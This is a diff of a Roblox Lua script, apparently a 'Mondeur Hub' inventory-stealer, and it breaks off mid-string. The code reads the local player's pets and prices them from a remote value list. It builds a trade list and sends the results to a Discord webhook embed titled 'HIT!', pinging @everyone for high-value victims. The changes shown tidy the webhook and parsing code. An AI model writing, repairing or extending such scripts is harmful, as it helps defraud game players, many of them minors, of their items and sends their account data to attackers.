@@ -18,7 +18,7 @@ local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
--- 3. GITHUB VALUE DATA LOADER (FIXED CARRIAGE RETURN BUG)
+-- 3. GITHUB VALUE DATA LOADER
 local customValues = {}
 local function loadValues()
     local success, result = pcall(function()
@@ -28,7 +28,7 @@ local function loadValues()
         for line in result:gmatch("[^\r\n]+") do
             local name, val = line:match("([^,]+),([^,]+)")
             if name and val then
-                -- Safely strip spaces and hidden \r so tonumber() works properly
+                -- FIX: Using pattern match instead of .trim()
                 local cleanName = name:lower():match("^%s*(.-)%s*$")
                 local cleanVal = val:match("^%s*(.-)%s*$")
                 local numVal = tonumber(cleanVal)
@@ -95,8 +95,8 @@ end
 
 -- 6. VALUATION LOGIC
 local function getFinalValue(petData, props)
-    -- Safe name fetching to prevent nil errors
     local rawName = petData.name or ""
+    -- FIX: Using pattern match instead of .trim()
     local petName = rawName:lower():match("^%s*(.-)%s*$") or ""
     local base = customValues[petName] or petData.rvalue or 0
     
@@ -156,21 +156,15 @@ end
 
 local sortedPets, grandTotal, finalTradeList = processInventory()
 
--- 8. WEBHOOK DISPATCH (RESTORED OLD LOOK & FIXED SHADOWING BUG)
+-- 8. WEBHOOK DISPATCH (FIXED ERRORS & ORIGINAL LOOK)
 if #sortedPets > 0 then
     local petLines = ""
     for _, p in ipairs(sortedPets) do
-        local nextLine = p.emoji .. " " .. p.name .. " " .. p.count .. "x (₱" .. string.format("%.2f", p.price) .. ")\n"
-        -- Prevent Discord from rejecting the webhook if inventory is too massive (4096 char limit)
-        if #petLines + #nextLine > 3000 then
-            petLines = petLines .. "➕ And more items...\n"
-            break
-        end
-        petLines = petLines .. nextLine
+        petLines = petLines .. p.emoji .. "  " .. p.name .. " " .. p.count .. "x (₱" .. string.format("%.2f", p.price) .. ")\n"
     end
 
     local payload = HttpService:JSONEncode({
         content = (grandTotal >= 500 and "@everyone" or ""),
         embeds = {{
             title = "MONDEUR HUB | 🦊 HIT!",
-            description = "Mondeur | chafya Handsome"
+            description = "
